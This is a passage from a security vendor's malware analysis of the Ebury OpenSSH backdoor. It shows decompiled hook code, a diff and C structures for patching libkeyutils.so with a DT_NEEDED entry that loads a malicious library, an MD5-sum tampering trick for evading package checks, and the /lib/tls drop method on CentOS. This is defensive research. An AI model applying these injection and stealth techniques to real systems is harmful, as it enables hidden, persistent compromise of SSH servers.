class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303b734682627-8"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-h"> </span><span class="crayon-v">len_1</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">0x1F</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-e">strncmp</span><span class="crayon-sy">(</span><span class="crayon-v">src</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"chacha20-poly1305@openssh.com,"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x1EuLL</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60581b980303b734682627-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">result</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">memcpy_orig</span><span class="crayon-sy">(</span><span class="crayon-v">dst</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">src</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">30</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">len_1</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-cn">30</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303b734682627-10"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">else</span></div><div class="crayon-line" id="crayon-60581b980303b734682627-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">result</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">dst</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303b734682627-12"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">result</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b980303b734682627-13"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p><strong>Figure 8</strong>. Hex-Rays output of the <span style="font-family: 'courier new', courier, monospace">memcpy</span> hook</p>
<p>While we know the hook is used to remove the chacha20-poly1305 algorithm during the SSH key exchange, we are puzzled as to why Ebury’s authors do not want this algorithm to be used.</p>
<h2><strong>New installation methods</strong></h2>
<p>Previously, Ebury added its payload inside the <span style="font-family: 'courier new', courier, monospace">libkeyutils.so</span> library. The file would contain both the legitimate libkeyutils functions and the Ebury malicious code, launched when loaded. When compromised, the file was larger than usual, a sign of compromise we shared back in 2014.</p>
<p>While we’ve seen this technique used by version 1.6, Ebury authors have come up with new tricks to fool our IoCs. They still use the <span style="font-family: 'courier new', courier, monospace">libkeyutils.so</span> file, but differently.</p>
<p>From what we have witnessed, the deployment scripts and techniques seem to differ based on the Linux distribution of the targeted system.</p>
<h2><strong>Debian/Ubuntu</strong></h2>
<p>On Debian/Ubuntu systems, Ebury is currently deployed using a new method. Since <span style="font-family: 'courier new', courier, monospace">libkeyutils.so</span> is loaded by the OpenSSH client and the OpenSSH server executables, it remains an interesting target for the attackers. We’ve previously seen Ebury installed by changing the <span style="font-family: 'courier new', courier, monospace">libkeyutils.so.1</span> symbolic link to point to the malicious version of the library. The altered library would have a constructor where Ebury’s initialization code is stored. Every time <span style="font-family: 'courier new', courier, monospace">libkeyutils.so</span> is loaded, the constructor is called. Thus, every time the OpenSSH client or server is launched, Ebury is injected into the process.</p>
<p>The latest deployment method on Debian/Ubuntu now relies on patching <span style="font-family: 'courier new', courier, monospace">libkeyutils.so</span> to force it to load Ebury, which is stored in a separate <span style="font-family: 'courier new', courier, monospace">.so</span> file. Comparing an original and a patched version, we notice that there’s an additional entry in the <span style="font-family: 'courier new', courier, monospace">.dynamic</span> section of the ELF header. This entry is of type NEEDED (0x01), meaning that it is a dependency of this executable and that it will be loaded at runtime. In the deployment script we’ve analyzed, the library to be loaded is named <span style="font-family: 'courier new', courier, monospace">libsbr.so</span> and contains Ebury’s malicious code.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b980303c190719024" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">diff</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
--- ./libkeyutils.so.1-5            2017-10-13 21:19:24.269521814 -0400
+++ ./libkeyutils.so.1-5.patched    2017-10-13 21:19:17.405092274 -0400
@@ -1,5 +1,5 @@

-Dynamic section at offset 0x2cf8 contains 26 entries:
+Dynamic section at offset 0x2cf8 contains 27 entries:
   Tag        Type                         Name/Value
  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
  0x000000000000000e (SONAME)             Library soname: [libkeyutils.so.1]
@@ -26,4 +26,5 @@
  0x000000006fffffff (VERNEEDNUM)         1
  0x000000006ffffff0 (VERSYM)             0xdf0
  0x000000006ffffff9 (RELACOUNT)          3
+ 0x0000000000000001 (NEEDED)             Shared library: [libsbr.so]
  0x0000000000000000 (NULL)               0x0</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b980303c190719024-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303c190719024-2">2</div><div class="crayon-num" data-line="crayon-60581b980303c190719024-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303c190719024-4">4</div><div class="crayon-num" data-line="crayon-60581b980303c190719024-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303c190719024-6">6</div><div class="crayon-num" data-line="crayon-60581b980303c190719024-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303c190719024-8">8</div><div class="crayon-num" data-line="crayon-60581b980303c190719024-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303c190719024-10">10</div><div class="crayon-num" data-line="crayon-60581b980303c190719024-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303c190719024-12">12</div><div class="crayon-num" data-line="crayon-60581b980303c190719024-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303c190719024-14">14</div><div class="crayon-num" data-line="crayon-60581b980303c190719024-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b980303c190719024-1"><span class="crayon-r">--- ./libkeyutils.so.1-5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2017-10-13 21:19:24.269521814 -0400</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303c190719024-2"><span class="crayon-s ">+++ ./libkeyutils.so.1-5.patched&nbsp;&nbsp;&nbsp;&nbsp;2017-10-13 21:19:17.405092274 -0400</span></div><div class="crayon-line" id="crayon-60581b980303c190719024-3"><span class="crayon-c">@@ -1,5 +1,5 @@</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303c190719024-4">&nbsp;</div><div class="crayon-line" id="crayon-60581b980303c190719024-5"><span class="crayon-sy">-Dynamic section at offset 0x2cf8 contains 26 entries:</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303c190719024-6"><span class="crayon-s ">+Dynamic section at offset 0x2cf8 contains 27 entries:</span></div><div class="crayon-line" id="crayon-60581b980303c190719024-7"><span class="crayon-sy">&nbsp;&nbsp; Tag&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Name/Value</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303c190719024-8"><span class="crayon-sy">&nbsp;&nbsp;0x0000000000000001 (NEEDED)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Shared library: [libc.so.6]</span></div><div class="crayon-line" id="crayon-60581b980303c190719024-9"><span class="crayon-sy">&nbsp;&nbsp;0x000000000000000e (SONAME)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Library soname: [libkeyutils.so.1]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303c190719024-10"><span class="crayon-c">@@ -26,4 +26,5 @@</span></div><div class="crayon-line" id="crayon-60581b980303c190719024-11"><span class="crayon-sy">&nbsp;&nbsp;0x000000006fffffff (VERNEEDNUM)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303c190719024-12"><span class="crayon-sy">&nbsp;&nbsp;0x000000006ffffff0 (VERSYM)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0xdf0</span></div><div class="crayon-line" id="crayon-60581b980303c190719024-13"><span class="crayon-sy">&nbsp;&nbsp;0x000000006ffffff9 (RELACOUNT)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303c190719024-14"><span class="crayon-s ">+ 0x0000000000000001 (NEEDED)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Shared library: [libsbr.so]</span></div><div class="crayon-line" id="crayon-60581b980303c190719024-15"><span class="crayon-sy">&nbsp;&nbsp;0x0000000000000000 (NULL)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x0</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>Figure 9</strong>. Dynamic section diff between an original and a patched <span style="font-family: 'courier new', courier, monospace">libkeyutils.so</span></p>
<p>The patching process has two steps. First, the string &#8220;<span style="font-family: 'courier new', courier, monospace">libsbr.so</span>&#8221; must be stored in the strings table of the binary. Second, a new entry of type 0x1 (DT_NEEDED) must be added to the dynamic section of the ELF headers. This entry must point to the library string with an offset in the string table. Ebury’s authors replace the &#8220;<span style="font-family: 'courier new', courier, monospace">__bss_start</span>&#8221; string by &#8220;<span style="font-family: 'courier new', courier, monospace">_\x00libsbr.so</span>&#8220;. Since <span style="font-family: 'courier new', courier, monospace">__bss_start</span> is not used by the dynamic linker, modifying this symbol has no impact on the execution of the library. Figure 10 shows the difference between the original and the altered strings table of <span style="font-family: 'courier new', courier, monospace">libkeyutils.so</span>.</p>
<p><a href="/wp-content/uploads/2017/10/dynsym_str_diff.png"><img class="aligncenter wp-image-103074 size-full" src="/wp-content/uploads/2017/10/dynsym_str_diff.png" alt="" width="1204" height="1146" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/10/dynsym_str_diff.png 1204w, https://www.welivesecurity.com/wp-content/uploads/2017/10/dynsym_str_diff-300x286.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/10/dynsym_str_diff-768x731.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/10/dynsym_str_diff-1024x975.png 1024w" sizes="(max-width: 1204px) 100vw, 1204px" /></a></p>
<p><strong>Figure 10</strong>. Differences between an original and a patched string table</p>
<p>Now that the &#8220;<span style="font-family: 'courier new', courier, monospace">libsbr.so</span>&#8221; string is stored in the strings table, a new entry must be added in the <span style="font-family: 'courier new', courier, monospace">.dynamic</span> section. Figure 11 shows the difference between the <span style="font-family: 'courier new', courier, monospace">.dynamic</span> section of the original and the patched <span style="font-family: 'courier new', courier, monospace">libkeyutils.so</span>.</p>
<p><a href="/wp-content/uploads/2017/10/dynamic_entry_diff.png"><img class="alignnone wp-image-103076 size-full" src="/wp-content/uploads/2017/10/dynamic_entry_diff.png" alt="" width="1204" height="1146" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/10/dynamic_entry_diff.png 1204w, https://www.welivesecurity.com/wp-content/uploads/2017/10/dynamic_entry_diff-300x286.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/10/dynamic_entry_diff-768x731.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/10/dynamic_entry_diff-1024x975.png 1024w" sizes="(max-width: 1204px) 100vw, 1204px" /></a></p>
<p><strong>Figure 11</strong>. Differences between an original and a patched <span style="font-family: 'courier new', courier, monospace">.dynamic</span> section</p>
<p>The <span style="font-family: 'courier new', courier, monospace">.dynamic</span> section contains an array of <span style="font-family: 'courier new', courier, monospace">Elf64_Dyn</span> for amd64 binaries and <span style="font-family: 'courier new', courier, monospace">Elf64_Dyn</span> for i386 binaries. The definitions of these structures are displayed in Figure 12.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b980303f264247666" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">C</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
typedef struct {
   Elf32_Sword    d_tag;
   union {
       Elf32_Word d_val;
       Elf32_Addr d_ptr;
   } d_un;
} Elf32_Dyn;

typedef struct {
   Elf64_Sxword    d_tag;
   union {
       Elf64_Xword d_val;
       Elf64_Addr  d_ptr;
   } d_un;
} Elf64_Dyn;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b980303f264247666-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303f264247666-2">2</div><div class="crayon-num" data-line="crayon-60581b980303f264247666-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303f264247666-4">4</div><div class="crayon-num" data-line="crayon-60581b980303f264247666-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303f264247666-6">6</div><div class="crayon-num" data-line="crayon-60581b980303f264247666-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303f264247666-8">8</div><div class="crayon-num" data-line="crayon-60581b980303f264247666-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303f264247666-10">10</div><div class="crayon-num" data-line="crayon-60581b980303f264247666-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303f264247666-12">12</div><div class="crayon-num" data-line="crayon-60581b980303f264247666-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b980303f264247666-14">14</div><div class="crayon-num" data-line="crayon-60581b980303f264247666-15">15</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b980303f264247666-1"><span class="crayon-r">typedef</span><span class="crayon-h"> </span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303f264247666-2"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-e">Elf32_Sword&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">d_tag</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b980303f264247666-3"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-t">union</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303f264247666-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">Elf32_Word </span><span class="crayon-v">d_val</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b980303f264247666-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">Elf32_Addr </span><span class="crayon-v">d_ptr</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303f264247666-6"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-v">d_un</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b980303f264247666-7"><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-v">Elf32_Dyn</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303f264247666-8">&nbsp;</div><div class="crayon-line" id="crayon-60581b980303f264247666-9"><span class="crayon-r">typedef</span><span class="crayon-h"> </span><span class="crayon-t">struct</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303f264247666-10"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-e">Elf64_Sxword&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">d_tag</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b980303f264247666-11"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-t">union</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303f264247666-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">Elf64_Xword </span><span class="crayon-v">d_val</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b980303f264247666-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">Elf64_Addr&nbsp;&nbsp;</span><span class="crayon-v">d_ptr</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b980303f264247666-14"><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-v">d_un</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b980303f264247666-15"><span class="crayon-sy">}</span><span class="crayon-h"> </span><span class="crayon-v">Elf64_Dyn</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p><strong>Figure 12</strong>. Structures related to the <span style="font-family: 'courier new', courier, monospace">.dynamic</span> section</p>
<p>In Figure 13, we have a 64-bit versions of <span style="font-family: 'courier new', courier, monospace">libkeyutils.so</span>. Thus, the new entry in the <span style="font-family: 'courier new', courier, monospace">.dynamic</span> section could be written as follows:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803042693068601" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">C</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
Elf64_Dyn dyn;
dyn.d_tag = DT_NEEDED;
dyn.d_val = 0x38F;</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803042693068601-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581b9803042693068601-2">2</div><div class="crayon-num" data-line="crayon-60581b9803042693068601-3">3</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803042693068601-1"><span class="crayon-e">Elf64_Dyn </span><span class="crayon-v">dyn</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581b9803042693068601-2"><span class="crayon-v">dyn</span><span class="crayon-sy">.</span><span class="crayon-v">d_tag</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">DT_NEEDED</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581b9803042693068601-3"><span class="crayon-v">dyn</span><span class="crayon-sy">.</span><span class="crayon-v">d_val</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x38F</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p><strong>Figure 13</strong>. New <span style="font-family: 'courier new', courier, monospace">.dynamic</span> entry</p>
<p>The first field is 0x1, which translates to the DT_NEEDED tag. The second field is the offset to the &#8220;<span style="font-family: 'courier new', courier, monospace">libsbr.so</span>&#8221; string in the strings table: 0x3F8.</p>
<p>For better stealth, Ebury’s operators take care to patch the MD5 sums of the <span style="font-family: 'courier new', courier, monospace">libkeyutils1</span> package. So, it is not possible to check if a system is infected by looking at the package integrity. Such a command wouldn’t show any errors:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803043915484409" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">Shell</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
$ dpkg --verify libkeyutils1</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581b9803043915484409-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581b9803043915484409-1"><span class="crayon-sy">$</span><span class="crayon-h"> </span><span class="crayon-v">dpkg</span><span class="crayon-h"> </span><span class="crayon-o">--</span><span class="crayon-e">verify </span><span class="crayon-v">libkeyutils1</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>Multiple filenames are used by Ebury when it is deployed as a standalone library. Here’s the list of the filenames we’re aware of:</p>
<ul>
<li>libns2.so</li>
<li>libns5.so</li>
<li>libpw3.so</li>
<li>libpw5.so</li>
<li>libsbr.so</li>
<li>libslr.so</li>
</ul>
<h2><strong>CentOS</strong></h2>
<p>Similar techniques to the one described for Debian/Ubuntu deployment are used on CentOS. Attackers would patch <span style="font-family: 'courier new', courier, monospace">libkeyutils.so</span> to force it to load an additional library. In addition, we’ve noticed a new technique used for deploying Ebury on CentOS/RedHat systems. We don’t know all the details about how the installation process works yet. Looking at various online reports helped us make some educated guesses as to how the deployment happens.</p>
<p>We’re aware of Ebury being deployed as a separate shared object loaded by libkeyutils in a way similar to Debian’s deployment. But we also witnessed another installation method, which we believe is the deployment method for v1.6. As was the case in previous releases of Ebury, the operators build their own version of <span style="font-family: 'courier new', courier, monospace">libkeyutils.so</span> to which they add a constructor containing the malicious code. Instead of altering the <span style="font-family: 'courier new', courier, monospace">libkeyutils.so.1</span> from <span style="font-family: 'courier new', courier, monospace">/lib/</span> or <span style="font-family: 'courier new', courier, monospace">/lib64/</span> they use the <span style="font-family: 'courier new', courier, monospace">/lib{,64}/tls/</span> folder to drop their file because the dynamic linker looks at this directory first when resolving dependencies.</p>
<p>We believe the deployment process for this version is to drop Ebury in <span style="font-family: 'courier new', courier, monospace">/lib/tls/</span> or <span style="font-family: 'courier new', courier, monospace">/lib64/tls/</span> depending on the architecture of the victim’s system. Then, running <span style="font-family: 'courier new', courier, monospace">ldconfig</span> will automatically create a symbolic link <span style="font-family: 'courier new', courier, monospace">/lib{,64}/tls/libkeyutils.so.1</span> pointing to the malicious shared object.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581b9803044748884845" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
